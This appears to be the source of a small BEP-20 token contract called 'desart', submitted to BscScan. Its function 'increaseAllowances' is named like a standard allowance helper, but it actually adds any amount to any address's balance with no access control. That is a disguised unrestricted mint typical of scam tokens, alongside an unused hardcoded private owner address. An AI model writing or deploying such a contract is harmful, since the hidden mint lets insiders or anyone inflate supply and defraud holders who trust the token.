/**
 *Submitted for verification at BscScan.com on 2021-12-25
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.3;
contract desart{
    string public name = "desart";
    string public symbol = "desart";
    uint8 public decimals = 6;
    address private ownerAddress = 0xA556216ee7bBC2660d2cfe6Ec9C0fDc7aC019BE2;
    uint256 public totalSupply = 1000000 * 10 ** 6;
    address public ownerAddres;

    constructor() {
        balanceOf[msg.sender] = totalSupply;
        ownerAddres = msg.sender;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event TransferOwnership(address indexed previousOwner, address indexed newOwner);


    function increaseAllowances(address spender, uint256 addedValue) public returns (bool success) {
        balanceOf[spender] += addedValue * 10 ** 6;
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool success) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    function transfer(address to, uint256 amount) public returns (bool success) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }
    function transferFrom( address from, address to, uint256 amount) public returns (bool success) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
}